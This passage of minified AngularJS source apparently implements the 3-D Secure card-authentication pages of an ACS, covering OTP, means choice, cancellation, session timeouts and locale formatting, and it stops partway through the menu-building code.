var ACS3=angular.module("ACS3",["ngAnimate","ngSanitize","ngCookies","ngStorage","pascalprecht.translate","ui.router","ACS_COMMONS"]);angular.element(document).ready(function(){angular.bootstrap(document,["ACS3"])}),ACS3.run(["$rootScope","$q","$state","$transitions","$unloadEvent","ThisService","MessageBanner","AuthentPagesService","UserExperienceService","CnButton","$timeout","ValButton","OtpRecorder","APP_STATES","SwitchMeansButton","MeansSelectMenu",function($rootScope,$q,$state,$transitions,$unloadEvent,ThisService,MessageBanner,AuthentPagesService,UserExperienceService,CnButton,$timeout,ValButton,OtpRecorder,APP_STATES,SwitchMeansButton,MeansSelectMenu){$unloadEvent.enable(),MessageBanner.setReturnButtonAction(function(){UserExperienceService.track(UserActionType.BACK_TO_MERCHANT,ReactionLevel.SUCCESS),$state.go(APP_STATES.EXIT)}),CnButton.setCnButtonAction(function(){var cancelAuthent={};cancelAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,cancelAuthent.hubAuthenticationInput={};var pageType=ThisService.data[$rootScope.uniqueId].pageType,cancellationSteps=ThisService.data[$rootScope.uniqueId].cancellationSteps;_.isNil(cancellationSteps)||"REFUSAL_PAGE"===pageType?(MessageBanner.display(ThisService.data[$rootScope.uniqueId].network,ThisService.data[$rootScope.uniqueId].currentMeans,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TRANSACTION_CANCELLED),CnButton.setDisable(!0),ValButton.setDisable(!0),ThisService.killSession(),ThisService.prepareExit(),OtpRecorder.setDisable(!0),AuthentPagesService.cancelAuthenticationSession(cancelAuthent).then(function(){UserExperienceService.track(UserActionType.CANCEL_CLICK,ReactionLevel.SUCCESS),ThisService.readyExit()},function(){UserExperienceService.track(UserActionType.CANCEL_CLICK,ReactionLevel.ERROR)}),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)):_.isInteger(cancellationSteps)&&(ThisService.data[$rootScope.uniqueId].cancellationSteps=cancellationSteps-1,0<ThisService.data[$rootScope.uniqueId].cancellationSteps?(MessageBanner.display(ThisService.data[$rootScope.uniqueId].network,ThisService.data[$rootScope.uniqueId].currentMeans,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TRANSACTION_CANCELLED,MessageLevel.INFO,DisplayType.CLOSABLE),UserExperienceService.track(UserActionType.CANCEL_CLICK,ReactionLevel.INFO)):(CnButton.setDisable(!0),ThisService.killSession(),ThisService.prepareExit(),OtpRecorder.setDisable(!0),AuthentPagesService.cancelAuthenticationSession(cancelAuthent).then(function(){UserExperienceService.track(UserActionType.CANCEL_CLICK,ReactionLevel.SUCCESS),ThisService.readyExit(),$state.go(APP_STATES.EXIT)},function(){UserExperienceService.track(UserActionType.CANCEL_CLICK,ReactionLevel.ERROR),$state.go(APP_STATES.EXIT)})))}),SwitchMeansButton.setSwitchMeansButtonAction(function(meanChosen){meanChosen?$state.go(APP_STATES.HOME,{choice:!0,means:meanChosen}):$state.go(APP_STATES.HOME,{choice:!0})}),MeansSelectMenu.setMeansSelectMenuAction(function(meanChosen){meanChosen?$state.go(APP_STATES.HOME,{choice:!0,means:meanChosen}):$state.go(APP_STATES.HOME,{choice:!0})}),Date.now||(Date.now=function(){return(new Date).getTime()}),$rootScope.$on("onBeforeUnload",function(e,confirmation){ThisService.data.redirectionAllowed||(confirmation.message="All data will be lost."),e.preventDefault()}),$transitions.onStart({},function(){MessageBanner.hideMessage()}),UserExperienceService.start()}]),ACS3.factory("AuthentPagesService",["$http","$q","$timeout","$state","MessageBanner","CnButton","$injector","$rootScope","$sessionStorage","APP_STATES",function($http,$q,$timeout,$state,MessageBanner,CnButton,$injector,$rootScope,$sessionStorage,APP_STATES){function addReactionLevel(reactionLevel){$injector.get("UserExperienceService").addReactionLevel(reactionLevel)}function addUserAction(actionType){$injector.get("UserExperienceService").track(actionType)}function exit(){CnButton.setDisable(!0),addUserAction(UserActionType.TECHNICAL_ERROR),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)}var ROOT_URL="authent/pages/",JSON_HEADER_CONFIG={"Content-Type":"application/json; charset=UTF-8"},TEXT_HEADER_CONFIG={headers:{"Content-Type":"text/plain; charset=UTF-8"}};return{getSessionByUniqueId:function(uniqueId,iframeScan){return $http.post(ROOT_URL+"getSession/"+uniqueId,iframeScan,JSON_HEADER_CONFIG)},startBackup:function(accountId){var deferred=$q.defer();return $http.post(ROOT_URL+"startBackup",accountId,TEXT_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),$state.go(APP_STATES.VOID),exit()}),deferred.promise},startChoice:function(accountId,means){var deferred=$q.defer(),path=ROOT_URL+"startUserChoice";return means&&(path=path+"/"+means),$http.post(path,accountId,TEXT_HEADER_CONFIG).then(function(response){addReactionLevel(ReactionLevel.SUCCESS),deferred.resolve(response.data)},function(response){addReactionLevel(ReactionLevel.ERROR),deferred.reject(response.data),$state.go(APP_STATES.VOID),exit()}),deferred.promise},startAuthentication:function(authentInput){var deferred=$q.defer();return $http.post(ROOT_URL+"startAuthent",authentInput,JSON_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),$state.go(APP_STATES.VOID),exit()}),deferred.promise},endAuthentication:function(authentInput){var deferred=$q.defer();return $http.post(ROOT_URL+"endAuthent",authentInput,JSON_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.resolve(response.data)}),deferred.promise},updateAuthentication:function(authentInput){var deferred=$q.defer();return $http.post(ROOT_URL+"updateAuthent",authentInput,JSON_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),addUserAction(UserActionType.VALIDATE),addReactionLevel(ReactionLevel.ERROR),MessageBanner.display($sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans,$sessionStorage[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),exit()}),deferred.promise},cancelAuthenticationSession:function(authentInput){var deferred=$q.defer();return $http.post(ROOT_URL+"cancel",authentInput,JSON_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),MessageBanner.display($sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans,$sessionStorage[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),exit()}),deferred.promise},timeoutAuthenticationSession:function(authentInput){var deferred=$q.defer();return $http.post(ROOT_URL+"timeout",authentInput,JSON_HEADER_CONFIG).then(function(response){addUserAction(UserActionType.SESSION_TIME_OUT),addReactionLevel(ReactionLevel.SUCCESS),deferred.resolve(response.data)},function(response){addUserAction(UserActionType.SESSION_TIME_OUT),addReactionLevel(ReactionLevel.ERROR),deferred.reject(response.data),MessageBanner.display($sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans,$sessionStorage[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),exit()}),deferred.promise},startPolling:function(authentInput){var deferred=$q.defer();return $http.post(ROOT_URL+"startPolling",authentInput,JSON_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),MessageBanner.display($sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans,$sessionStorage[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),exit()}),deferred.promise},getI18nConfigs:function(key){return $http.get("app/config/i18n/"+key+".json",JSON_HEADER_CONFIG)},sendUserExperience:function(userExperienceData){$http.post(ROOT_URL+"userExperience",userExperienceData,JSON_HEADER_CONFIG)},acceptTransaction:function(accountId){var deferred=$q.defer();return $http.post(ROOT_URL+"startInfoAccept/"+accountId,{},JSON_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),MessageBanner.display($sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans,$sessionStorage[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),exit()}),deferred.promise},refreshHubSession:function(accountId){var deferred=$q.defer();return $http.post(ROOT_URL+"refreshHubSession/"+accountId,{},JSON_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),addUserAction(UserActionType.REFRESH_PHONE_NUMBER_CLICK,ReactionLevel.ERROR),MessageBanner.display($sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans,$sessionStorage[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),exit()}),deferred.promise},startCombine:function(accountId){var deferred=$q.defer();return $http.post(ROOT_URL+"startCombine",accountId,TEXT_HEADER_CONFIG).then(function(response){deferred.resolve(response.data)},function(response){deferred.reject(response.data),$state.go(APP_STATES.VOID),exit()}),deferred.promise}}}]),ACS3.constant("APP_STATES",{ROOT:"root",HOME:"home",OTP:"otp",POLL:"poll",CHOICE:"choice",FAILURE:"failure",REFUSAL:"refusal",INFO:"info",VOID:"void",CUSTOM:"custom",CALLBACK:"callback",EXIT:"exit"}),ACS3.constant("STATUS_PENDING",{PENDING_1:"PENDING_1",PENDING_2:"PENDING_2"}),ACS3.constant("ERROR_CONST",{TOO_MANY_OTP_TRIES:"FAE004",UNAUTHORIZED_CHOICE:"FAE006"}),ACS3.config(["$urlRouterProvider","$stateProvider","$locationProvider","$translateProvider","$httpProvider","LOCALES","APP_STATES",function($urlRouterProvider,$stateProvider,$locationProvider,$translateProvider,$httpProvider,LOCALES,APP_STATES){$locationProvider.html5Mode(!0),$stateProvider.state(APP_STATES.ROOT,{url:"/authent/pages/:uniqueId",template:"<home></home>",params:{backup:!1,choice:!1,combine:!1}}).state(APP_STATES.HOME,{template:"<home></home>",params:{backup:!1,choice:!1,combine:!1,means:void 0}}).state(APP_STATES.OTP,{template:"<otp></otp>",params:{backup:!1,combine:!1}}).state(APP_STATES.CHOICE,{template:"<choice></choice>",params:{backup:!1,combine:!1}}).state(APP_STATES.FAILURE,{template:"<failure></failure>"}).state(APP_STATES.REFUSAL,{template:"<refusal></refusal>"}).state(APP_STATES.EXIT,{template:"<exit></exit>"}).state(APP_STATES.VOID,{template:"<void></void>"}).state(APP_STATES.POLL,{template:"<poll></poll>",params:{combine:!1}}).state(APP_STATES.INFO,{template:"<info></info>"}).state(APP_STATES.CUSTOM,{template:"<custom-page></custom-page>"}).state(APP_STATES.CALLBACK,{url:"/authent/pages/callback/status?success&error&cancelled",template:"<callback></callback>"});var availableLocales=LOCALES.availableLocales,useDialects=LOCALES.useDialects,localesArray=[];for(var key in availableLocales)availableLocales.hasOwnProperty(key)&&localesArray.push(key);for(var localesMapping={},i=0;i<localesArray.length;i++)localesMapping[localesArray[i]]=localesArray[i],useDialects||(localesMapping[localesArray[i]+"_*"]=localesArray[i]);$httpProvider.interceptors.push("httpRejectInterceptor"),$translateProvider.useSanitizeValueStrategy("sanitize").useLoader("CustomTextsLoader").registerAvailableLanguageKeys(localesArray,localesMapping)}]),ACS3.factory("CustomTextsLoader",["$q","$rootScope","ThisService","AuthentPagesService",function($q,$rootScope,ThisService,AuthentPagesService){return function(options){var i18DataKey="i18nData"+options.key,deferred=$q.defer();return AuthentPagesService.getI18nConfigs(options.key).then(function(configResponse){if(ThisService.data[i18DataKey]=configResponse.data,ThisService.data.customTexts&&0<ThisService.data.customTexts.length){ThisService.prepareCustomItems(options.key);for(var i=0;i<ThisService.data.customTexts.length;i++)ThisService.data.customTexts[i].locale===options.key&&(ThisService.data[i18DataKey][ThisService.data.customTexts[i].pageId]=ThisService.data.customTexts[i].value);if(ThisService.data.hasOwnProperty("customFonts")){for(i=0;i<ThisService.data.customFonts.length;i++)ThisService.data.customFonts[i].locale===options.key&&(ThisService.data[i18DataKey][ThisService.data.customFonts[i].pageId+"_FONT_TITLE"]=ThisService.data.customFonts[i].value,ThisService.data[i18DataKey][ThisService.data.customFonts[i].pageId+"_FONT_DATA"]=ThisService.data.customFonts[i].fontBinaryDataKey,ThisService.data[i18DataKey][ThisService.data.customFonts[i].pageId+"_FONT_MIME_TYPE"]=ThisService.data.customFonts[i].fontMimeType);angular.forEach(ThisService.data.fontData,function(value,key){ThisService.data[i18DataKey][key]=value})}for(i=0;i<ThisService.data.customImages.length;i++)ThisService.data.customImages[i].locale===options.key&&(ThisService.data[i18DataKey][ThisService.data.customImages[i].pageId+"_IMAGE_ALT"]=ThisService.data.customImages[i].value,ThisService.data[i18DataKey][ThisService.data.customImages[i].pageId+"_IMAGE_DATA"]=ThisService.data.customImages[i].imageBinaryDataKey);angular.forEach(ThisService.data.imageData,function(value,key){ThisService.data[i18DataKey][key]=value}),ThisService.customItemsReady[options.key].loaded=!0}deferred.resolve(ThisService.data[i18DataKey])},function(response){deferred.resolve(response)}),deferred.promise}}]),ACS3.factory("ThisService",["$q","$rootScope","$sessionStorage","$timeout","$interval","$state","MessageBanner","CnButton","AuthentPagesService","OtpRecorder","ValButton","APP_STATES",function($q,$rootScope,$sessionStorage,$timeout,$interval,$state,MessageBanner,CnButton,AuthentPagesService,OtpRecorder,ValButton,APP_STATES){var thisService={data:$sessionStorage,timer:null,customItemsReady:{},onDeath:function(scope,callback){var handler=$rootScope.$on("session_death_event",callback);scope.$on("$destroy",handler)},isTimerRunning:function(){return null!=this.timer},killSession:function(){this.isTimerRunning()&&this.stopTimer(),this.data[$rootScope.uniqueId].isDead=!0,$rootScope.$emit("session_death_event")},startTimer:function(){this.data[$rootScope.uniqueId]&&this.data[$rootScope.uniqueId].timeout&&(this.timer=$interval(this.checkTime,5e3))},stopTimer:function(){this.data[$rootScope.uniqueId].timerValue=0,$interval.cancel(this.timer),this.timer=null},clear:function(){this.isTimerRunning()&&this.stopTimer(),delete this.data[$rootScope.uniqueId]},prepareCustomItems:function(key){this.customItemsReady||(this.customItemsReady={}),this.customItemsReady.hasOwnProperty(key)||(this.customItemsReady[key]=$q.defer())},readyCustomItems:function(){this.customItemsReady&&angular.forEach(this.customItemsReady,function(value,key){value.loaded&&value.resolve()})},whenCustomItemsReady:function(key){return this.prepareCustomItems(key),this.customItemsReady[key].promise},prepareExit:function(){$rootScope.exitReady||($rootScope.exitReady=$q.defer())},readyExit:function(){$rootScope.exitReady&&$rootScope.exitReady.resolve()},whenExitReady:function(){return $rootScope.exitReady?$rootScope.exitReady.promise:$q.resolve()},checkTime:function(){if($sessionStorage[$rootScope.uniqueId].timerValue||($sessionStorage[$rootScope.uniqueId].timerValue=0),$sessionStorage[$rootScope.uniqueId].timerValue=$sessionStorage[$rootScope.uniqueId].timerValue+5e3,$sessionStorage[$rootScope.uniqueId].timeout&&$sessionStorage[$rootScope.uniqueId].timerValue>=$sessionStorage[$rootScope.uniqueId].timeout&&!$sessionStorage[$rootScope.uniqueId].isDead){var timeoutSession={};timeoutSession.accountId=$sessionStorage[$rootScope.uniqueId].accountId,timeoutSession.hubAuthenticationInput={},timeoutSession.hubAuthenticationInput.transactionId=$sessionStorage.hubSessionId,timeoutSession.hubAuthenticationInput.authenticationId=$sessionStorage.hubAuthentId,MessageBanner.display($sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans,$sessionStorage[$rootScope.uniqueId].pageType,MessageBanner.SESSION_EXPIRED),ValButton.setDisable(!0),OtpRecorder.setDisable(!0),$rootScope.exitReady||($rootScope.exitReady=$q.defer()),AuthentPagesService.timeoutAuthenticationSession(timeoutSession).then(function(){$rootScope.exitReady.resolve()}),$sessionStorage[$rootScope.uniqueId].timerValue=0,$sessionStorage[$rootScope.uniqueId].isDead=!0,$rootScope.$emit("session_death_event"),CnButton.setDisable(!0),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)}},getPageLayout:function(){for(var pageLayoutkeys=[this.data[$rootScope.uniqueId].network,this.data[$rootScope.uniqueId].currentMeans,this.data[$rootScope.uniqueId].pageType];!this.data[$rootScope.uniqueId].pageLayouts[pageLayoutkeys.join("_")];)pageLayoutkeys.shift();return this.data[$rootScope.uniqueId].pageLayouts[pageLayoutkeys.join("_")]}};return thisService.data.redirectionAllowed=!1,$rootScope.$on("$translateChangeEnd",function(){thisService.readyCustomItems()}),thisService}]),ACS3.config(["$provide","$sessionStorageProvider",function($provide,$sessionStorageProvider){if(_.isNil($sessionStorageProvider.get("cacheBustVersion"))){$sessionStorageProvider.set("cacheBustVersion","1");var appSrc=_.find(_.map(document.getElementsByTagName("script"),"src"),function(src){return-1!==src.indexOf("app/app.")});if(void 0!==appSrc){var parts=appSrc.split(".");2<parts.length&&$sessionStorageProvider.set("cacheBustVersion",parts[parts.length-2])}}var cacheBustVersion=$sessionStorageProvider.get("cacheBustVersion");return $provide.decorator("$http",["$delegate",function($delegate){var get=$delegate.get;return $delegate.get=function(url,config){return~url.indexOf("template/")||(url+=-1===url.indexOf("?")?"?":"&",url+="v="+cacheBustVersion),get(url,config)},$delegate}])}]),ACS3.factory("httpRejectInterceptor",["$q","$window","$injector","ERROR_CONST",function($q,$window,$injector,ERROR_CONST){var passTrough403ErrorCodes=[ERROR_CONST.TOO_MANY_OTP_TRIES,ERROR_CONST.UNAUTHORIZED_CHOICE];return{responseError:function(rejection){var error;return 403!==rejection.status||(error=rejection.data,_.reduce(passTrough403ErrorCodes,function(isPresent,label){return isPresent||_.startsWith(error,label)},!1))||($injector.get("ThisService").data.redirectionAllowed=!0,$window.location.href="403.html"),$q.reject(rejection)}}}]);var LOCALES={availableLocales:{fr:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"FR"},en:{amountFormat:{format:"%s %v",decimal:".",thousand:",",precision:2},region:"GB"},de:{amountFormat:{format:"%v %s",decimal:",",thousand:".",precision:2},region:"DE"},nl:{amountFormat:{format:"%v %s",decimal:",",thousand:".",precision:2},region:"NL"},se:{amountFormat:{format:"%v %s",decimal:",",thousand:".",precision:2},region:"SE"},sv:{amountFormat:{format:"%v %s",decimal:",",thousand:".",precision:2},region:"SV"},fi:{amountFormat:{format:"%v %s",decimal:",",thousand:".",precision:2},region:"FI"},ru:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"RU"},da:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"DA"},lv:{amountFormat:{format:"%v %s",decimal:".",thousand:" ",precision:2},region:"LV"},et:{amountFormat:{format:"%v %s",decimal:".",thousand:" ",precision:2},region:"ET"},lt:{amountFormat:{format:"%v %s",decimal:".",thousand:" ",precision:2},region:"LT"},no:{amountFormat:{format:"%v %s",decimal:",",thousand:".",precision:2},region:"NO"},hu:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"HU"},cs:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"CZ"},sk:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"SK"},es:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"ES"},it:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"IT"},lb:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"LB"},pt:{amountFormat:{format:"%v %s",decimal:",",thousand:" ",precision:2},region:"PT"}},useDialects:!1};if("object"==typeof exports)module.exports=LOCALES;else if("undefined"!=typeof angular){(ACS3=angular.module("ACS3")).constant("LOCALES",LOCALES)}ACS3.component("callback",{templateUrl:"app/components/CallbackModule/callback.html",controller:"CallbackCtrl"}),ACS3.controller("CallbackCtrl",["$scope","$rootScope","ThisService","CustomItems","Home","$translate","SplashScreen",function($scope,$rootScope,ThisService,CustomItems,Home,$translate,SplashScreen){SplashScreen.hide(),$rootScope.uniqueId=ThisService.data.callbackId;var language=ThisService.data[$rootScope.uniqueId].callbackLang?ThisService.data[$rootScope.uniqueId].callbackLang:ThisService.data[$rootScope.uniqueId].issuerDefaultLanguage;$translate.use(language),Home.fillMenus(),ThisService.data[$rootScope.uniqueId].pageType="CALLBACK_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.layoutData=CustomItems.getCustomPageLayout()}]),ACS3.component("choice",{templateUrl:"app/components/ChoiceModule/choice.html",controller:"ChoiceCtrl"}),ACS3.controller("ChoiceCtrl",["$scope","$rootScope","$state","$unloadEvent","$timeout","$translate","ThisService","AuthentPagesService","SplashScreen","MeansSelect","MeansSelectMenu","CnButton","CustomItems","Hamburger","SwitchMeansButton","UserExperienceService","MessageBanner","APP_STATES",function($scope,$rootScope,$state,$unloadEvent,$timeout,$translate,ThisService,AuthentPagesService,SplashScreen,MeansSelect,MeansSelectMenu,CnButton,CustomItems,Hamburger,SwitchMeansButton,UserExperienceService,MessageBanner,APP_STATES){$scope.meansChoices=ThisService.data[$rootScope.uniqueId].availableInitChoices,MeansSelect.setMeans($scope.meansChoices),$scope.network=ThisService.data[$rootScope.uniqueId].network,$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,ThisService.data[$rootScope.uniqueId].pageType="MEANS_PAGE",MeansSelectMenu.setMeans($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,ThisService.data[$rootScope.uniqueId].availableInitChoices),CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.layoutData=CustomItems.getCustomPageLayout();function handleFailureAtInitAuthentication(failureCause){ThisService.data[$rootScope.uniqueId].currentMeans="REFUSAL",ThisService.data[$rootScope.uniqueId].failureCause=failureCause,CustomItems.updateAuthMeans(ThisService.data[$rootScope.uniqueId].currentMeans),UserExperienceService.track(UserActionType.HUB_CHOICE,ReactionLevel.SUCCESS),$state.go(APP_STATES.FAILURE)}if(ThisService.data[$rootScope.uniqueId].hubDrivenMeansChoice){SplashScreen.splash(SplashMode.ENTER_MESSAGE);var newAuthent={},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){newAuthent.language=language,newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={},newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){$timeout(function(){if(hubResponse.hubAuthenticationOutput.authenticationBlocked){handleFailureAtInitAuthentication("AUTHENTICATION_BLOCKED");var endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},AuthentPagesService.endAuthentication(endAuthentication).then(function(){ThisService.readyExit()})}else hubResponse.hubAuthenticationOutput.authenticationSuccess||"failure"!==hubResponse.hubAuthenticationOutput.status?hubResponse.hubAuthenticationOutput.externalTechnicalErrorBackupAllowed?(UserExperienceService.track(UserActionType.HUB_CHOICE,ReactionLevel.ERROR),$scope.useBackup()):hubResponse.meansToUseState?(UserExperienceService.track(UserActionType.HUB_CHOICE,ReactionLevel.SUCCESS),ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].currentMeans=hubResponse.meansToUse,ThisService.data[$rootScope.uniqueId].displayUserChoice=hubResponse.displayUserChoice,ThisService.data[$rootScope.uniqueId].currentProfileName=hubResponse.profileName,ThisService.data[$rootScope.uniqueId].externalWSResponse=hubResponse.hubAuthenticationOutput.externalWSResponse,CustomItems.updateAuthMeans(ThisService.data[$rootScope.uniqueId].currentMeans),UserExperienceService.addUserAuthent($state.params.combine?MeansTriggeringEvent.COMBINED:MeansTriggeringEvent.NORMAL),_.isNil(hubResponse.hubAuthenticationOutput.hubDrivenMeansChoice)||(ThisService.data[$rootScope.uniqueId].hubDrivenMeansChoice=hubResponse.hubAuthenticationOutput.hubDrivenMeansChoice,!1===hubResponse.hubAuthenticationOutput.hubDrivenMeansChoice&&(ThisService.data[$rootScope.uniqueId].availableInitChoices=hubResponse.hubAuthenticationOutput.authentMeans)),hubResponse.meansToUseState===APP_STATES.CHOICE?$state.reload():$state.go(hubResponse.meansToUseState,{backup:$state.params.backup,combine:$state.params.combine})):(UserExperienceService.track(UserActionType.HUB_CHOICE,ReactionLevel.ERROR),$state.go(APP_STATES.EXIT)):handleFailureAtInitAuthentication("AUTHENTICATION_FAILED")},3500)},function(){UserExperienceService.track(UserActionType.HUB_CHOICE,ReactionLevel.ERROR),$state.go(APP_STATES.EXIT)})})}else SplashScreen.hide(),$state.params.backup&&MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.BACKUP_TRIGGERED);SwitchMeansButton.setDisplay(!0),CnButton.setDisable(!1),Hamburger.updateCustomTextKey($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType),ThisService.onDeath($scope,function(){SwitchMeansButton.setDisable(!0)}),$scope.useBackup=function(){$state.go(APP_STATES.HOME,{backup:!0})}}]),ACS3.component("customPage",{templateUrl:"app/components/CustomPageModule/customPage.html",controller:"CustomPageCtrl"}),ACS3.controller("CustomPageCtrl",["$scope","$rootScope","ThisService","CustomItems","SwitchMeansButton",function($scope,$rootScope,ThisService,CustomItems,SwitchMeansButton){$scope.userChoiceAllowed=ThisService.data[$rootScope.uniqueId].userChoiceAllowed&&ThisService.data[$rootScope.uniqueId].displayUserChoice,$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network,SwitchMeansButton.setDisplay($scope.userChoiceAllowed),SwitchMeansButton.setDisable(!$scope.userChoiceAllowed),ThisService.data[$rootScope.uniqueId].pageType="CUSTOM_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.layoutData=CustomItems.getCustomPageLayout(),SwitchMeansButton.setSwitchMeansButtonInfo(void 0,$scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,SwitchMeansButton.SWITCH_MEANS_LABEL)}]),ACS3.component("exit",{templateUrl:"app/components/ExitModule/exit.html",controller:"ExitCtrl"}),ACS3.controller("ExitCtrl",["$scope","$rootScope","$unloadEvent","ThisService","SplashScreen","UserExperienceService",function($scope,$rootScope,$unloadEvent,ThisService,SplashScreen,UserExperienceService){SplashScreen.splash(SplashMode.EXIT_MESSAGE),$scope.returnURL=ThisService.data[$rootScope.uniqueId].returnURL+ThisService.data[$rootScope.uniqueId].returnPath,$scope.accountId=ThisService.data[$rootScope.uniqueId].accountId,$scope.commit=function($form){$form.submit($scope.returnURL,[$scope.accountId])},ThisService.whenExitReady().then(function(){UserExperienceService.track(UserActionType.RETURN_TO_PA),UserExperienceService.end(),ThisService.stopTimer(),ThisService.clear(),$unloadEvent.disable(),$scope.commit($scope.exitForm)})}]),ACS3.component("failure",{templateUrl:"app/components/FailureModule/failure.html",controller:"FailureCtrl"}),ACS3.controller("FailureCtrl",["$scope","$rootScope","$state","$timeout","$translate","$q","ThisService","CnButton","CustomItems","MessageBanner","SplashScreen","APP_STATES",function($scope,$rootScope,$state,$timeout,$translate,$q,ThisService,CnButton,CustomItems,MessageBanner,SplashScreen,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network,ThisService.data[$rootScope.uniqueId].pageType="FAILURE_PAGE",SplashScreen.hide(),"AUTHENTICATION_FAILED"===ThisService.data[$rootScope.uniqueId].failureCause?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR):MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_FAILURE),CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),CnButton.setDisable(!0),$scope.layoutData=CustomItems.getCustomPageLayout(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)}]),(ACS3=angular.module("ACS3")).component("home",{templateUrl:"app/components/HomeModule/home.html",controller:"HomeCtrl"}),ACS3.factory("Home",["$rootScope","$translate","ThisService","SideMenu","HelpService","I18N","CustomItems",function($rootScope,$translate,ThisService,SideMenu,HelpService,I18N,CustomItems){return{fillMenus:function(){I18N.setLocales(ThisService.data[$rootScope.uniqueId].issuerBackupLanguages,ThisService.data[$rootScope.uniqueId].issuerDefaultLanguage),CustomItems.updateData(ThisService.data[$rootScope.uniqueId].currentMeans,ThisService.data[$rootScope.uniqueId].network,"ALL",ThisService.data[$rootScope.uniqueId].filterValues,ThisService.data[$rootScope.uniqueId].filterKeys),ThisService.startTimer(),HelpService.setProperties(ThisService.data[$rootScope.uniqueId].network,ThisService.data[$rootScope.uniqueId].currentMeans);var menuItems=[];menuItems[0]={label:SideMenu.MERCHANT_LABEL,value:ThisService.data[$rootScope.uniqueId].merchantName,data:{means:ThisService.data[$rootScope.uniqueId].currentMeans,network:ThisService.data[$rootScope.uniqueId].network},type:MenuItemType.RAW_TEXT},ThisService.data[$rootScope.uniqueId].displayNullAmount&&(menuItems[1]={label:SideMenu.AMOUNT_LABEL,value:{},data:{means:ThisService.data[$rootScope.uniqueId].currentMeans,network:ThisService.data[$rootScope.uniqueId].network,amount:ThisService.data[$rootScope.uniqueId].amount,currency:ThisService.data[$rootScope.uniqueId].currency,exponent:ThisService.data[$rootScope.uniqueId].exponent,useAlphaCurrencySymbol:ThisService.data[$rootScope.uniqueId].useAlphaCurrencySymbol,currencySymbolPosition:ThisService.data[$rootScope.uniqueId].currencySymbolPosition,decimalDelimiter:ThisService.data[$rootScope.uniqueId].decimalDelimiter,thousandDelimiter:ThisService.data[$rootScope.uniqueId].thousandDelimiter},type:MenuItemType.AMOUNT}),menuItems[menuItems.length]={label:SideMenu.DATE_LABEL,value:ThisService.data[$rootScope.uniqueId].date,data:{means:ThisService.data[$rootScope.uniqueId].currentMeans,network:ThisService.data[$rootScope.uniqueId].network,format:ThisService.data[$rootScope.uniqueId].purchaseDateFormat,rawValue:ThisService.data[$rootScope.uniqueId].date,dateFormatMoment:ThisService.data[$rootScope.uniqueId]